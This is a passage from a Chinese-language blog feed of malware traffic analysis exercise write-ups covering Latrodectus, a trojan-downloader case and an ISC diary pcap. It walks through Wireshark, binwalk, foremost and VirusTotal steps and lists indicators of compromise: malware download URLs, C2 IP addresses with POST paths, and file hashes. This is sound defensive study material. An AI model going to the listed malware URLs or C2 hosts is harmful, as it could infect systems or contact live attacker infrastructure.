id="线索梳理"><a href="#线索梳理" class="headerlink" title="线索梳理"></a>线索梳理</h3><ul><li>Environment（调查的资产信息&#x2F;环境）<ul><li>LAN segment range</li><li>Domain</li><li>Domain controller</li><li>LAN segment gateway</li><li>LAN segment broadcast address</li></ul></li><li>Incident Report<ul><li>Executive summary（感染过程总结）</li><li>Victim details（受害者细节）<ul><li>IP address</li><li>MAC address</li><li>User account name</li></ul></li><li>Indicators of compromise (IOCs)<ul><li>SHA256 hash</li><li>File size</li><li>File name</li><li>File location</li><li>File description：</li></ul></li><li>HTTP traffic to retrieve the malware<ul><li>即 下载恶意文件的HTTP流量记录</li></ul></li><li>HTTP traffic for remote request infection activity<ul><li>即 感染相关的远程请求活动的HTTP流量记录</li></ul></li><li>INVESTIGATION（调查过程）<ul><li>最后可以给一个精简的流程图</li></ul></li></ul></li></ul><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2024-04-05-THURSDAY-DATA-DUMP-FROM-ASTAROTH-GUILDMA-MALWARE-INFECTION&quot;&gt;&lt;a href=&quot;#2024-04-05-THURSDAY-DATA-DUMP-FROM-ASTAROTH-GUILDMA-MALWARE-INFECTION&quot; class=&quot;headerlink&quot; title=&quot;2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION&quot;&gt;&lt;/a&gt;2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>DATA DUMP FROM LATRODECTUS INFECTION</title>
    <link href="https://2in9ya2.github.io/20240409-Malware/"/>
    <id>https://2in9ya2.github.io/20240409-Malware/</id>
    <published>2024-04-12T02:41:48.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-04-09-TUESDAY-DATA-DUMP-FROM-LATRODECTUS-INFECTION"><a href="#2024-04-09-TUESDAY-DATA-DUMP-FROM-LATRODECTUS-INFECTION" class="headerlink" title="2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION"></a>2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>通过命令<code>http.response.code==200</code>查看返回成功的<code>http</code>流量，并逐一追踪</p><p><img src="/images/20240409-Malware/2024-04-12-14-01-25-image.png"></p><p>这个交互看起来像是进行了一个 <code>OCSP</code>（在线证书状态协议）查询。在此查询中，客户端请求某个证书的状态，而服务器<code>（ocsp.digicert.com）</code>则返回了该证书的状态信息（即 <code>OCSP</code> 响应）</p><p><img src="/images/20240409-Malware/2024-04-12-14-02-31-image.png"></p><p>第二条流请求了证书<img src="/images/20240409-Malware/2024-04-12-14-04-02-image.png"> </p><p>第三条流是一个 <code>OPTIONS</code> 请求，用于查询服务器支持的方法。<code>87.249.49.206</code>服务器返回了状态码 <code>200 OK</code>，表示请求成功，并在响应头部中列出了服务器支持的方法，包括 <code>OPTIONS, HEAD, GET, PROPFIND, DELETE, COPY, MOVE, PROPPATCH, LOCK, UNLOCK</code></p><p><img src="/images/20240409-Malware/2024-04-12-14-06-15-image.png"></p><p>第四条流是一个 <code>OPTIONS</code> 请求，用于查询<code>87.249.49.206</code>服务器对 <code>/share</code> 资源支持的方法。服务器返回了状态码 <code>200 OK</code>，表示请求成功，并在响应头部中列出了服务器支持的方法，包括 <code>OPTIONS, HEAD, GET, PROPFIND, DELETE, COPY, MOVE, PROPPATCH, LOCK, UNLOCK</code></p><p><img src="/images/20240409-Malware/2024-04-12-14-13-07-image.png"></p><p>第五条流，请求服务器<code>/share/esetond.msi</code>，服务器返回了一个<code>.msi</code>文件</p><p><img src="/images/20240409-Malware/2024-04-12-14-13-54-image.png"></p><p>查询域名发现其可能为恶意地址</p><p><img src="/images/20240409-Malware/2024-04-12-14-19-17-image.png"></p><p>将<code>.msi</code>文件的<code>sha256</code>值在<code>virustotal</code>中查询，发现其为恶意软件</p><p><img src="/images/20240409-Malware/2024-04-12-14-20-48-image.png"></p><h3 id="MSI文件分析"><a href="#MSI文件分析" class="headerlink" title=".MSI文件分析"></a>.MSI文件分析</h3><p>一些恶意代码可能嵌入到<code>.msi</code>文件中，故通过<a href="https://learn.microsoft.com/zh-tw/windows/win32/msi/orca-exe">Orca</a>对<code>.MSI</code>文件进行分析，<a href="https://rvsec0n.wordpress.com/2020/02/22/msi-malware-analysis/">分析方法</a>参考（<strong>注意：请勿在个人电脑上分析，请在虚拟机内分析</strong>）</p><p>其二进制表如下，其中包括<code>exe、jpg、dll</code>以及其他格式的二进制文件</p><p><img src="/images/20240409-Malware/2024-04-12-15-47-48-image.png"></p><p>其文件表只包含一个<code>Util.dll</code>文件</p><p><img src="/images/20240409-Malware/2024-04-12-16-00-58-image.png">  </p><p>组件表是具有用于指定将.cab中存在的文件安装到哪里的功能表</p><p><img src="/images/20240409-Malware/2024-04-12-16-04-29-image.png"></p><p>控制表（我猜是用于程序的控制，比如<code>PushButton</code>）</p><p><img src="/images/20240409-Malware/2024-04-12-16-06-58-image.png"> </p><p><strong>CustomAction Table</strong> 参考里面说是最重要的表格。（不知道都运行了什么0.0）多数<code>Action</code>运行了<code>aicustact.dll</code></p><p><img src="/images/20240409-Malware/2024-04-12-16-08-23-image.png">  </p><p>使用 msi 的注册表功能在注册表键<code> Software\[Manufacturer]\[ProductName]</code>中注册值</p><p><img src="/images/20240409-Malware/2024-04-12-16-21-23-image.png"></p><p>没有发现任何线索，可能我的分析方法有问题，如果有任何建议请访问我的<a href="https://twitter.com/2in9ya2">twitter</a>，联系我。</p><p>利用<code>foremost</code>对<code>msi</code>文件进行分离</p><p><img src="/images/20240409-Malware/2024-04-12-16-35-23-image.png"></p><p>查看<code>exe</code>文件的<code>sha256</code>值，并通过<code>virustotal</code>查询，发现其为<code>AIDetectMalware</code>，</p><p><code>dll</code>文件未发现问题</p><p><img src="/images/20240409-Malware/2024-04-12-16-38-35-image.png"></p><h3 id="加密流"><a href="#加密流" class="headerlink" title="加密流"></a>加密流</h3><p>在获取<code>.msi</code>文件之前，受害主机和<code>87.249.49.206</code>进行了一段时间的加密通信</p><p><img src="/images/20240409-Malware/2024-04-12-17-10-00-image.png"></p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>并没有发现题目里提供的文件（大失败 T T，如果你发现了请联系我<a href="https://twitter.com/2in9ya2">twitter</a>）</p><p> <img src="/images/20240409-Malware/2024-04-12-16-42-27-image.png"></p><h3 id="线索梳理"><a href="#线索梳理" class="headerlink" title="线索梳理"></a>线索梳理</h3><ul><li>Environment（调查的资产信息&#x2F;环境）<ul><li>LAN segment range:10.4.9.0&#x2F;24</li><li>Domain:-</li><li>Domain controller:10.4.9.1</li><li>LAN segment gateway:10.4.9.1</li><li>LAN segment broadcast address:10.4.9.255</li></ul></li><li>Incident Report<ul><li>Executive summary:<br>用户被嵌入恶意软件的.msi文件感染</li><li>Victim details<ul><li>IP address:10.4.9.101</li><li>MAC address:00:26:c7:2f:c6:7e</li><li>User account name:-</li></ul></li><li>Indicators of compromise (IOCs)<ul><li>SHA256 hash:08075e8a6dcc6a5fca089348edbd5fc07b2b0b26a26a46e0dd401121fdaa88d3</li><li>File size:1,649,664 字节</li><li>File name:esetnod.msi</li><li>File location:<a href="http://kosukeshimura.com/share/esetnod.msi">http://kosukeshimura.com/share/esetnod.msi</a></li><li>File description:被恶意软件嵌入的.msi文件</li></ul></li><li>HTTP traffic to retrieve the malware<ul><li>5663    2024-04-10 07:44:29.351877    10.4.9.101    87.249.49.206    HTTP    kosukeshimura.com    GET &#x2F;share&#x2F;esetnod.msi HTTP&#x2F;1.1     http (80)    50367 (50367)        246        Intel_2f:c6:7e    Cisco_30:22:43</li></ul></li></ul></li></ul><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2024-04-09-TUESDAY-DATA-DUMP-FROM-LATRODECTUS-INFECTION&quot;&gt;&lt;a href=&quot;#2024-04-09-TUESDAY-DATA-DUMP-FROM-LATRODECTUS-INFECTION&quot; class=&quot;headerlink&quot; title=&quot;2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION&quot;&gt;&lt;/a&gt;2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS</title>
    <link href="https://2in9ya2.github.io/20200731-Malware/"/>
    <id>https://2in9ya2.github.io/20200731-Malware/</id>
    <published>2024-04-11T06:36:47.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-07-31-TRAFFIC-ANALYSIS-EXERCISE-TECSOLUTIONS"><a href="#2020-07-31-TRAFFIC-ANALYSIS-EXERCISE-TECSOLUTIONS" class="headerlink" title="2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS"></a>2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>首先过滤HTTP流并追踪</p><p><img src="/images/20200731-Malware/2024-04-11-14-44-25-image.png"></p><p> 发现域名<code>e-dsm.com.br</code>返回了一个<code>doc</code>文件<img src="/images/20200731-Malware/2024-04-11-14-45-30-image.png"></p><p>域名<code>jambino.us</code>返回了一个<code>exe</code>可执行文件</p><p><img src="/images/20200731-Malware/2024-04-11-14-48-18-image.png"></p><p>随后不断的向<code>201.235.10.215</code> <code>IP</code>地址<code>POST</code>数据</p><p><img src="/images/20200731-Malware/2024-04-11-14-54-58-image.png"></p><p><img src="/images/20200731-Malware/2024-04-11-14-51-01-image.png"></p><p>将doc文件和exe文件导出（<strong>注意：请勿在个人电脑上导出，请在虚拟机内导出</strong>）</p><p><img src="/images/20200731-Malware/2024-04-11-14-59-49-image.png"></p><p>使用<code>binwalk</code>对<code>doc</code>文件进行分析</p><p><img src="/images/20200731-Malware/2024-04-11-15-01-07-image.png"></p><p>使用<code>foremost</code>将文件导出，发现有一个<code>ole</code>文件夹和一个<code>zip</code>文件夹，zip文件内为<code>xml</code>文件</p><p><img src="/images/20200731-Malware/2024-04-11-15-02-00-image.png"></p><p>计算<code>.ole</code>文件的<code>MD5</code>值，并在<code>virustotal</code>内查询，发现其为木马下载器，那么后续<code>exe</code>文件则为可执行木马程序</p><p><img src="/images/20200731-Malware/2024-04-11-15-05-57-image.png"></p><p>计算<code>exe</code>文件的<code>MD5</code>值，并在<code>virustotal</code>内查询，确定其为木马程序<img src="/images/20200731-Malware/2024-04-11-15-08-00-image.png"></p><h3 id="C2流量"><a href="#C2流量" class="headerlink" title="C2流量"></a>C2流量</h3><p>下载木马程序之后，主机<code>10.7.31.101</code>与主机为<code>201.235.10.215</code>、<code>104.236.52.89:8080</code>交互频繁</p><p><img src="/images/20200731-Malware/2024-04-11-15-22-57-image.png"></p><h3 id="加密流"><a href="#加密流" class="headerlink" title="加密流"></a>加密流</h3><p>无可疑地址</p><h3 id="其他流"><a href="#其他流" class="headerlink" title="其他流"></a>其他流</h3><p><code>10.7.31.101</code>发出<code>NBNS</code>注册请求到 <code>NBNS</code> 服务器，其计算机名为<code>DESKTOP-DPHW305&lt;20&gt; (Server service)</code></p><p><img src="/images/20200731-Malware/2024-04-11-15-38-41-image.png"></p><p> 通过过滤条件<strong>kerberos.CNameString</strong>来查找账户名称</p><blockquote><p>Kerberos 是一个网络身份验证协议，用于在不安全的网络中安全地验证用户和服务之间的身份。</p><p>以下是 Kerberos 协议的工作原理：</p><ol><li><p><strong>认证服务器（AS）</strong>：用户向 Kerberos 认证服务器请求访问服务。AS 验证用户的身份，并生成用于与 Ticket Granting Server (TGS) 通信的 Ticket-Granting Ticket (TGT)。TGT 是受加密保护的，只有 TGS 可以解密它。</p></li><li><p><strong>票证授予服务器（TGS）</strong>：用户收到 TGT 后，可以使用它向 TGS 请求访问特定的服务。用户向 TGS 提交 TGT 和服务标识符的请求。TGS 验证用户的 TGT，并生成一个用于访问特定服务的服务票证（Service Ticket）。服务票证也是受加密保护的。</p></li><li><p><strong>服务请求</strong>：用户收到服务票证后，可以将它与服务请求一起发送给服务。服务收到请求后，使用它和自己的密钥解密服务票证。如果票证有效且未被篡改，服务将向用户提供所需的服务。</p></li></ol></blockquote><p><img src="/images/20200731-Malware/2024-04-11-15-54-13-image.png"></p><h3 id="线索梳理"><a href="#线索梳理" class="headerlink" title="线索梳理"></a>线索梳理</h3><ul><li>Environment（调查的资产信息&#x2F;环境）<ul><li>LAN segment range:10.07.31.0&#x2F;24</li><li>Domain:tecsolutions.info</li><li>Domain controller:10.07.31.7</li><li>LAN segment gateway:10.07.31.1</li><li>LAN segment broadcast address:10.07.31.255</li></ul></li><li>Incident Report<ul><li>Executive summary:<br>用户gregory.simmons被木马感染</li><li>Victim details（受害者细节）<ul><li>IP address: 10.7.31.101</li><li>MAC address: 00:0c:6e:12:af:38</li><li>User account name: gregory.simmons</li></ul></li><li>Indicators of compromise (IOCs)<ul><li>SHA256 hash:0a3aaa398a6abe7a4ba256812b8b6632fa4595b4ac5c47b459d5a6a911c2d202</li><li>File size:913,503 字节</li><li>File name:3tknamb7298632293.exe</li><li>File location:<a href="http://jambino.us/tv/DYsPb/">http://jambino.us/tv/DYsPb/</a></li><li>File description:可执行文件</li></ul></li><li>HTTP traffic to retrieve the malware<ul><li>191    2020-07-31 08:25:37.088661    10.7.31.101    191.6.208.51    HTTP    e-dsm.com.br    GET &#x2F;www&#x2F;ZdJCAB&#x2F; HTTP&#x2F;1.1     http (80)    49737 (49737)        488        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>531    2020-07-31 08:26:19.877245    10.7.31.101    67.20.112.81    HTTP    jambino.us    GET &#x2F;tv&#x2F;DYsPb&#x2F; HTTP&#x2F;1.1     http (80)    49751 (49751)        123        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li></ul></li><li>HTTP traffic for remote request infection activity<ul><li>1493    2020-07-31 08:26:34.733614    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;RLVIcVHpdWjKMHfJsK&#x2F;bhAzHJy&#x2F;vazwovI5B9BcchWQ&#x2F;d0EvU2Xl&#x2F;HQ7AQetdQggMrPULmis&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>1649    2020-07-31 08:26:56.312136    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;M7aBEffyXE&#x2F;Upa44JYc0iD8C5Co5qj&#x2F;QxcEX6A0fDBvDo&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>1675    2020-07-31 08:26:57.327828    10.7.31.101    104.236.52.89    HTTP    104.236.52.89:8080    POST &#x2F;y1Oc&#x2F;CRTtjoStAe&#x2F;03wHuC&#x2F; HTTP&#x2F;1.1     http-alt (8080)    49817 (49817)        570        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>1842    2020-07-31 08:27:13.551157    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;2lOJG5Lepy9SF&#x2F;6rmms2u4C61LmFD&#x2F;hJubcUz&#x2F;13vVTTA5&#x2F;kRmZYIUJ67VF1I&#x2F;GyiwnO6oOQatOesN4K&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>1881    2020-07-31 08:27:19.007452    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;qKSwAKe1Mi&#x2F;y5QsEBixxmL45MPHwaD&#x2F;smvp&#x2F;78W7iuovnPDTvP2w&#x2F;10jxRo2zF6M&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2003    2020-07-31 08:27:29.328238    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;o9O08G04DzIZG8OWRp&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2543    2020-07-31 08:28:12.784950    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;LCWZY47XwmugeO3&#x2F;3z2TvDhczd&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2558    2020-07-31 08:28:12.975985    10.7.31.101    104.236.52.89    HTTP    104.236.52.89:8080    POST &#x2F;rQDNZBxm3Rpz&#x2F;YdX3soU3MRPD&#x2F;fXFnwkKVcXuwwBkpsSq&#x2F; HTTP&#x2F;1.1     http-alt (8080)    49825 (49825)        350        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2685    2020-07-31 08:28:28.385792    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;aNIce30YT&#x2F;xzZyFctinQ3Jkn&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2697    2020-07-31 08:28:28.655094    10.7.31.101    104.236.52.89    HTTP    104.236.52.89:8080    POST &#x2F;RaGu&#x2F;PUTIkmMWtxHtctq&#x2F;du2EPQGClXV&#x2F; HTTP&#x2F;1.1     http-alt (8080)    49826 (49826)        1490        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>3260    2020-07-31 08:29:21.910776    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;4DsE&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        382        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>3861    2020-07-31 08:43:48.725324    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;NemVGY4zT&#x2F;f6eDx8v6CbHNUXS&#x2F;gjuMfPtC&#x2F;j2SXoNwzJzR&#x2F; HTTP&#x2F;1.1     http (80)    49985 (49985)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4037    2020-07-31 08:44:31.428936    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;yguqyvZp1YxK083S&#x2F;H5kIaZFW692xUc&#x2F;HLuonj6146&#x2F; HTTP&#x2F;1.1     http (80)    49985 (49985)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4064    2020-07-31 08:44:36.331335    10.7.31.101    104.236.52.89    HTTP    104.236.52.89:8080    POST &#x2F;xian&#x2F;balloon&#x2F; HTTP&#x2F;1.1  (application&#x2F;x-www-form-urlencoded)    http-alt (8080)    49987 (49987)        722        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4178    2020-07-31 08:59:10.832559    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;VmjfI&#x2F;jygtnUpXR&#x2F;kxLUe7h097jcjEAJPIM&#x2F;u8O5&#x2F;jHD8f&#x2F;NiJ7CP0jmzegr&#x2F; HTTP&#x2F;1.1     http (80)    49989 (49989)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4414    2020-07-31 08:59:26.656364    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;FlpErlAFJoc1f77w3J&#x2F; HTTP&#x2F;1.1     http (80)    49989 (49989)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4574    2020-07-31 09:13:59.964790    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;RoEy0QXUh0&#x2F; HTTP&#x2F;1.1     http (80)    49999 (49999)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li></ul></li><li>INVESTIGATION<ul><li>首先检查http传输的exe可执行文件</li><li>发现C2流量</li></ul></li></ul></li></ul><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p><strong>DCERPC</strong></p><blockquote><p>DCERPC（Distributed Computing Environment Remote Procedure Calls）是一种远程过程调用（RPC）协议，用于在分布式计算环境中进行通信。它最初是由OSF（Open Software Foundation）开发的，后来成为了 DCE（Distributed Computing Environment）标准的一部分。</p></blockquote><p><strong>DRSUAPI</strong></p><blockquote><p>DRSUAPI（Directory Replication Service Remote Administration Interface）是用于管理 Windows 活动目录（Active Directory）复制服务的远程管理接口。它提供了一组用于管理和监视活动目录复制的远程过程调用（RPC）接口。</p></blockquote><p><strong>LLMNR</strong></p><blockquote><p>LLMNR 是 Link-Local Multicast Name Resolution 的缩写，是一种用于在局域网中进行主机名解析的协议。它通常用于 Windows 系统中，并且是 Windows Vista 及更高版本中的默认网络服务之一。</p></blockquote><p><strong>LDAP</strong></p><blockquote><p>LDAP 是 Lightweight Directory Access Protocol 的缩写，是一种用于访问和维护分布式目录服务的协议。它最初是由大学提供的工具和服务的联合开发团队（University of Michigan）开发的，并成为了互联网工程任务组（IETF）的标准协议。</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://traffic.y1ng.org/0x3_26-8-2020/">TECSOLUTIONS - Traffic Analysis Train</a></p><p><a href="/images/20200731-Malware/2020-07-31-traffic-analysis-exercise-answers.pdf">2020-07-31-traffic-analysis-exercise-answers.pdf</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2020-07-31-TRAFFIC-ANALYSIS-EXERCISE-TECSOLUTIONS&quot;&gt;&lt;a href=&quot;#2020-07-31-TRAFFIC-ANALYSIS-EXERCISE-TECSOLUTIONS&quot; class=&quot;headerlink&quot; title=&quot;2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS&quot;&gt;&lt;/a&gt;2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>PCAP AND INFO FOR AN ISC DIARY</title>
    <link href="https://2in9ya2.github.io/20200804-Malware/"/>
    <id>https://2in9ya2.github.io/20200804-Malware/</id>
    <published>2024-04-11T01:25:09.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-08-04-PCAP-AND-INFO-FOR-AN-ISC-DIARY"><a href="#2020-08-04-PCAP-AND-INFO-FOR-AN-ISC-DIARY" class="headerlink" title="2020-08-04 - PCAP AND INFO FOR AN ISC DIARY"></a>2020-08-04 - PCAP AND INFO FOR AN ISC DIARY</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>首先查看http流，并追踪第一条流<br><img src="/images/20200804-Malware/2024-04-11-09-29-36-image.png"></p><p>发现其传输的是一个可执行程序</p><p><img src="/images/20200804-Malware/2024-04-11-09-30-32-image.png"></p><p>查询请求的域名，发现其为恶意地址</p><p><img src="/images/20200804-Malware/2024-04-11-09-33-37-image.png"></p><p>导出该文件（<strong>注意：请勿在个人电脑中导出，请在虚拟机中导出</strong>）</p><p><img src="/images/20200804-Malware/2024-04-11-09-38-29-image.png"></p><p>该图片打不开</p><p><img src="/images/20200804-Malware/2024-04-11-09-44-22-image.png"></p><p>使用二进制分析攻击binwalk进行分析：</p><ol><li><p><strong>0x0</strong>: 这是一个Microsoft可执行文件，采用了可移植执行格式（PE）。</p></li><li><p><strong>0x457F5</strong>: 这是一个bix头部，具有一些元数据信息，包括创建时间、数据地址、入口点等。其OS标记为4.4BSD，名称为”lXD”。</p></li><li><p><strong>0x56639</strong>: 这也是一个bix头部，但这个文件看起来像是固件映像（Firmware Image）。</p></li><li><p><strong>0x6F484</strong>: 这是一个Base64标准索引表。</p></li><li><p><strong>0x73C70</strong> 和 <strong>0x73C9F</strong>: 这是HTML文档的头部和尾部。</p></li><li><p><strong>0x74160</strong> 和 <strong>0x7418F</strong>: 这是另一个HTML文档的头部和尾部。</p></li><li><p><strong>0xC3EE0</strong> 和 <strong>0xC3F09</strong>: 这是一个PNG图像和相应的Zlib压缩数据。</p></li></ol><p><img src="/images/20200804-Malware/2024-04-11-09-46-22-image.png"></p><p>使用foremost分离该文件，得到exe文件和png图片</p><p><img src="/images/20200804-Malware/2024-04-11-09-50-19-image.png"></p><p>查看exe文件的md5值，并通过virustotal查询</p><p> <img src="/images/20200804-Malware/2024-04-11-09-53-50-image.png"></p><p><img src="/images/20200804-Malware/2024-04-11-09-54-50-image.png"></p><h3 id="加密流"><a href="#加密流" class="headerlink" title="加密流"></a>加密流</h3><p>无可疑流  </p><h3 id="线索梳理"><a href="#线索梳理" class="headerlink" title="线索梳理"></a>线索梳理</h3><ul><li>恶意网站：<code>aromaterapiaclinicabrasil.com.br</code></li><li>恶意文件：<code>87411326.jpg</code></li><li>感染过程：受害者主机<code>10.8.4.101</code> 访问恶意网站<code>aromaterapiaclinicabrasil.com.br</code>后，下载图片形式的恶意文件<code>87411326.jpg</code>，该文件本质是一个exe文件，用excel的图标进行伪装，欺骗用户点击从而感染</li></ul><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p><strong>IGMPv3</strong></p><blockquote><p>IGMPv3（Internet Group Management Protocol version 3）是一种用于在IPv4网络中管理组成员关系的协议。它是IGMP协议的升级版本，主要用于在多播环境下管理主机和路由器之间的通信。</p></blockquote><p><strong>NBNS</strong></p><blockquote><p>NBNS（NetBIOS Name Service）是NetBIOS的一部分，用于在局域网中将NetBIOS名（通常是计算机名）解析为IP地址。NetBIOS是一种早期的局域网通信协议，用于在局域网中提供命名、会话和数据共享服务。</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://traffic.y1ng.org/0x2_24-8-2020/">Pcap and alerts for an ISC diary - Traffic Analysis Train</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2020-08-04-PCAP-AND-INFO-FOR-AN-ISC-DIARY&quot;&gt;&lt;a href=&quot;#2020-08-04-PCAP-AND-INFO-FOR-AN-ISC-DIARY&quot; class=&quot;headerlink&quot; title=&quot;2020-08-04 - PCAP AND INFO FOR AN ISC DIARY&quot;&gt;&lt;/a&gt;2020-08-04 - PCAP AND INFO FOR AN ISC DIARY&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER</title>
    <link href="https://2in9ya2.github.io/20200821-Malware/"/>
    <id>https://2in9ya2.github.io/20200821-Malware/</id>
    <published>2024-04-10T12:15:14.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-08-21-TRAFFIC-ANALYSIS-EXERCISE-PIZZA-BENDER"><a href="#2020-08-21-TRAFFIC-ANALYSIS-EXERCISE-PIZZA-BENDER" class="headerlink" title="2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER"></a>2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>首先查看HTTP流<br><img src="/images/20200821-Malware/image.png"><br>追踪第一条流，可以看到传输的是一个DLL可执行程序<br><img src="/images/20200821-Malware/image-1.png"><br>通过virustotal查询访问域名ncznw6a.com，发现该域名存在恶意行为<br><img src="/images/20200821-Malware/image-2.png"><br>随后请求域名<code>ctldl.windowsupdate.com</code>，IP为<code>8.252.146.254</code>，均返回304。<br><img src="/images/20200821-Malware/image-3.png"></p><h3 id="加密流"><a href="#加密流" class="headerlink" title="加密流"></a>加密流</h3><p>通过查看TLS流，发现除了知名的域名，存在其他域名<br>如<br><img src="/images/20200821-Malware/image-4.png"></p><hr><p><img src="/images/20200821-Malware/image-5.png"></p><hr><p><img src="/images/20200821-Malware/image-6.png"></p><hr><p><img src="/images/20200821-Malware/image-7.png"></p><h3 